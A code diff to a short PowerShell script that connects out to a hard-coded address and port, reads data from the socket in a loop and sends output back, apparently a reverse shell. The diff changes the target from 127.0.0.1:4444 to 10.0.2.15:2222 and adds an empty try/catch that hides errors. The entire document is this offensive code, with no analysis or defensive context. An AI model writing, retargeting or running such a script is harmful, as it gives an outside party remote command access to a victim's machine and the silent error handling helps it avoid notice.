@@ -1,8 +1,9 @@
-$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 4444)
+$client = New-Object System.Net.Sockets.TCPClient("10.0.2.15", 2222)
 $stream = $client.GetStream()
 $writer = New-Object System.IO.StreamWriter($stream)
 $writer.AutoFlush = $true
 
+try{
 [byte[]]$buffer = New-Object byte[] 1024
 while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i)
@@ -12,4 +13,5 @@ while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
     $stream.Write($sendbyte,0,$sendbyte.Length)
     $stream.Flush()
 }
+}catch{}
 $client.Close()
